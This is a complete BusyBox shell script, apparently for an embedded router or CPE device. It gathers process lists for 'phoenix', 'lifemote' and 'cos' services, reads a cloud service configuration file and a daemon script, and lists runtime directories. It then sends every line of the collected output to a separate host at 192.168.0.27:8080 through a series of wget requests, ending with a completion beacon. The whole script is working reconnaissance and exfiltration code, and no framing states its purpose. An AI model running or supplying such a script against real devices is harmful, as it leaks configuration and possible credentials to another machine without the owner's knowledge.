#!/bin/sh
trap '' 1
export PATH=$PATH:/bin:/usr/bin:/sbin:/usr/sbin
BB=/bin/busybox
BASE="http://192.168.0.27:8080"
OUT=/var/tmp/phoenix_check.txt

{
echo "PS_PHOENIX:"
$BB ps 2>/dev/null | $BB grep -i phoenix
echo ""
echo "PS_LIFEMOTE:"
$BB ps 2>/dev/null | $BB grep -i lifemote
echo ""
echo "LIFEMOTE_DAEMON:"
$BB head -20 /tmp/lifemote_cpe_daemon.sh 2>/dev/null || echo "(none)"
echo ""
echo "CLOUD_SERVICE_CFG:"
$BB cat /tmp/cloud_service.cfg 2>/dev/null || echo "(none)"
echo ""
echo "MISC_RW_LS:"
$BB ls -la /var/run/misc/misc_rw/ 2>/dev/null | head -20
echo ""
echo "MISC_RW_DETECTIC:"
$BB ls -la /var/run/misc/misc_rw/detectic/ 2>/dev/null || echo "(none)"
echo ""
echo "VAR_TMP_DETECTIC:"
$BB ls -la /var/tmp/detectic/ 2>/dev/null || echo "(none)"
echo ""
echo "VAR_TMP_LIFEMOTE:"
$BB ls -la /var/tmp/lifemote* 2>/dev/null || echo "(none)"
echo ""
echo "USERCONFIG_SIZE:"
$BB ls -la /var/run/misc/misc_rw/0x00300000 2>/dev/null || echo "(none)"
echo ""
echo "COS_PID:"
$BB ps 2>/dev/null | $BB grep 'cos$' || $BB ps 2>/dev/null | $BB grep ' cos '
} > "$OUT" 2>&1

# Upload each line
LINE=0
while IFS= read -r line; do
    ENCODED=$($BB echo -n "$line" | $BB sed 's/ /%20/g;s/&/%26/g;s/=/%3D/g;s/\//%2F/g;s/:/%3A/g;s/</%3C/g;s/>/%3E/g;s/|/%7C/g;s/(/%28/g;s/)/%29/g;s/;/%3B/g;s/"/%22/g;s/{/%7B/g;s/}/%7D/g' 2>/dev/null)
    $BB wget -q -T 5 -O /dev/null "${BASE}/env_line?n=${LINE}&d=${ENCODED}" 2>/dev/null || true
    LINE=$((LINE+1))
done < "$OUT"

$BB wget -q -T 5 -O /dev/null "${BASE}/done?status=ok&lines=${LINE}" 2>/dev/null || true
exit 0
